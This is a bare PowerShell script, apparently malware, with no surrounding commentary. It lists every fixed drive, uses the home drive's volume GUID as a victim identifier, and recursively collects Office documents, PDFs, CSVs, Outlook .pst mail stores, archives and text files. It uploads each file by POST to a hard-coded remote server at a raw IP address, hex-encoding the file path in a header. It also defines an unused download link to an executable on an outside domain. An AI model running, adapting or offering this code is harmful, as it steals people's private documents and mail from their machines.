$url_dwn1 = "http://eumr.site/load74h74838.exe"
$url = "http://185.244.41.109:8080/upld/"
$dsks = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3"
$reme = 0

# Identify Home Drive and set $reme to its index
$homeDrive = [System.Environment]::GetEnvironmentVariable("HOMEDRIVE")
foreach ($dsk in $dsks) {
    if ($dsk.DeviceID -eq $homeDrive) {
        $reme = $dsk
        break
    }
}

# Get Serial Number of Home Drive
$suuid = (Get-Volume -DriveLetter $reme.DeviceID[0]).ObjectId.Guid

# Define file types to search for
$fileTypes = @("*.doc", "*.docx", "*.pdf", "*.ppt", "*.pptx", "*.dot", "*.xls", "*.xlsx", "*.csv", "*.rtf", "*.mdb", "*.accdb", "*.pot", "*.pps", "*.pst", "*.ppa", "*.rar", "*.zip", "*.tar", "*.7z", "*.txt")

# Search and Upload Files
foreach ($dsk in $dsks) {
    $driveLetter = $dsk.DeviceID
    foreach ($fileType in $fileTypes) {
        $files = Get-ChildItem -Path "$driveLetter\" -Recurse -Filter $fileType -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $fileName = $file.FullName
            $fileNameHex = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($fileName)) -replace '-', ''
            $uri = "$url$suuid"
            $content = [IO.File]::ReadAllBytes($file.FullName)
            Invoke-RestMethod -Uri $uri -Method Post -InFile $fileName -Headers @{"File-Name" = $fileNameHex}
        }
    }
}

